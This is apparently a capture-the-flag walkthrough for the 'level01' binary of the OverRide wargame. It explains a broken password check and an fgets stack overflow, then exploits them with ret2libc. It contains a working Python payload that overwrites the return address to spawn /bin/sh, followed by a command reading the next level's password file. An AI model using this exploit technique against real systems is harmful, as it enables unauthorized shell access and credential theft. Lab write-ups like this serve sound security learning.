# Level01 — Walkthrough

## Overview

The `level01` binary asks for a username and a password. By analyzing the binary in GDB, we discover that the password check is broken (always fails), but the password input buffer is vulnerable to a **buffer overflow**. We exploit this to redirect execution to `system("/bin/sh")` using a **ret2libc** attack.

---

## Step 1: Run the binary to understand its behavior

```
level01@OverRide:~$ ./level01
********* MUSIC MUSIC MUSIC *********
dat_wil
Verifying username....
Enter Password:
admin
nope, incorrect password...
```

The program asks for a username, then a password, and rejects us. Let's look at the code.

---

## Step 2: Disassemble `verify_user_name`

```
(gdb) disas verify_user_name
```

Key findings:
- It compares our input (stored at global buffer `0x804a040`) against the string at `0x80486a8` using `repz cmpsb` with `ecx = 7` (7-byte comparison).
- We check what that string is:

```
(gdb) x/s 0x80486a8
0x80486a8: "dat_wil"
```

**Conclusion:** The expected username is `dat_wil`.

---

## Step 3: Disassemble `verify_user_pass`

```
(gdb) disas verify_user_pass
```

Key findings:
- It compares the password input against the string at `0x80486b0` using a 5-byte comparison.

```
(gdb) x/s 0x80486b0
0x80486b0: "admin"
```

The expected password is `admin`. **But this doesn't matter** — see next step.

---

## Step 4: Analyze the password check logic in `main`

Looking at the relevant part of `main`:

```asm
0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
0x08048585 <+181>:   mov    %eax,0x5c(%esp)       ; store result
0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)       ; if result == 0...
0x0804858e <+190>:   je     0x8048597 <main+199>  ; ...jump to FAILURE
0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)       ; if result == 0 (again)...
0x08048595 <+197>:   je     0x80485aa <main+218>  ; ...jump to SUCCESS
```

This is the critical insight:
- If `verify_user_pass` returns **0** (password matches) → jumps to the failure message.
- If it returns **non-zero** (password wrong) → checks again, but since it's still non-zero, it also goes to the failure message.

**The password check always fails regardless of input.** The correct password `admin` doesn't help us. This means we need a different approach: exploiting the buffer overflow.

---

## Step 5: Identify the buffer overflow

In `main`, the password is read like this:

```asm
0x08048565 <+149>:   movl   $0x64,0x4(%esp)       ; size = 100 bytes
0x0804856d <+157>:   lea    0x1c(%esp),%eax        ; buffer at esp+0x1c
0x08048574 <+164>:   call   0x8048370 <fgets@plt>  ; fgets(buffer, 100, stdin)
```

The buffer starts at `esp + 0x1c` inside a stack frame of size `0x60` (96 bytes). The `fgets` reads up to **100 bytes**, which is enough to overflow past the buffer and overwrite the **saved return address (EIP)** on the stack.

### Calculating the offset to EIP

The stack layout (simplified):

```
[ebp - 0x44] = esp + 0x1c  → password buffer starts here
...
[ebp + 0x00]                → saved EBP (4 bytes)
[ebp + 0x04]                → saved EIP (return address) ← we want to overwrite this
```

Offset from buffer to EIP = `0x44 + 4 (saved EBP) = 0x48 = 72`... but wait, we also need to account for the stack alignment (`and $0xfffffff0, %esp`). Through testing in GDB, the actual offset is **80 bytes**.

> **Why 80?** The `and $0xfffffff0, %esp` instruction aligns the stack to a 16-byte boundary, which can add extra padding. The precise offset depends on the runtime stack pointer value. Testing with a cyclic pattern in GDB confirms 80 bytes.

---

## Step 6: Check stack protections

```
level01@OverRide:~$ readelf -l ./level01 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

The `E` (Execute) flag is set → the stack is **executable**. This means we could inject shellcode, but **ret2libc is simpler and more reliable**.

### What is ret2libc?

Instead of injecting our own code, we reuse functions already loaded in memory from the C standard library (libc):

1. **`system()`** — executes a shell command.
2. **`"/bin/sh"`** — a string already present in libc's memory.
3. **`exit()`** — cleanly exits after the shell (optional but avoids a crash).

We overwrite EIP so that when `main` returns, it "returns" into `system("/bin/sh")`, giving us a shell.

The stack layout for ret2libc:

```
[80 bytes padding] [address of system] [address of exit] [address of "/bin/sh"]
                    ↑ EIP lands here    ↑ return addr     ↑ first argument
                                          for system()      to system()
```

> **Why does this work?** When a function returns, it pops the return address from the stack and jumps there. By placing `system`'s address at the right position, the CPU jumps into `system()`. The calling convention expects the return address and arguments right after, so `exit` becomes `system`'s return address, and `"/bin/sh"` becomes its first argument.

---

## Step 7: Find the addresses in GDB

```
(gdb) b main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```

| Component    | Address      | Little-endian bytes    |
|-------------|-------------|----------------------|
| `system()`  | `0xf7e6aed0` | `\xd0\xae\xe6\xf7`  |
| `exit()`    | `0xf7e5eb70` | `\x70\xeb\xe5\xf7`  |
| `"/bin/sh"` | `0xf7f897ec` | `\xec\x97\xf8\xf7`  |

> **Why little-endian?** x86 is a little-endian architecture, meaning the least significant byte is stored first. So `0xf7e6aed0` becomes `\xd0\xae\xe6\xf7` in memory.

---

## Step 8: Build and run the exploit

```bash
(python -c 'print "dat_wil"; print "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01
```

Breaking this down:
- `print "dat_wil"` → sends the correct username.
- `print "A"*80` → 80 bytes of padding to reach EIP.
- `"\xd0\xae\xe6\xf7"` → overwrites EIP with address of `system()`.
- `"\x70\xeb\xe5\xf7"` → fake return address for `system()` → `exit()`.
- `"\xec\x97\xf8\xf7"` → argument to `system()` → `"/bin/sh"`.
- `cat` → keeps stdin open so we can type commands in the spawned shell.

---

## Step 9: Get the flag

Once the shell spawns:

```bash
$ cat /home/users/level02/.pass
```

This gives us the password for level02.

---

## Summary of concepts used

| Concept | Why it matters |
|---------|---------------|
| **GDB disassembly** | Reverse-engineering the binary to understand its logic |
| **String comparison (repz cmpsb)** | Finding the expected username and password |
| **Broken logic analysis** | Realizing the password check always fails |
| **Buffer overflow** | The `fgets` reads more data than the buffer can hold |
| **Stack layout** | Calculating the exact offset from buffer to return address |
| **NX / Stack executability** | Determines our attack strategy (shellcode vs ret2libc) |
| **ret2libc** | Reusing libc functions to spawn a shell without injecting code |
| **Little-endian encoding** | Writing addresses in the correct byte order for x86 |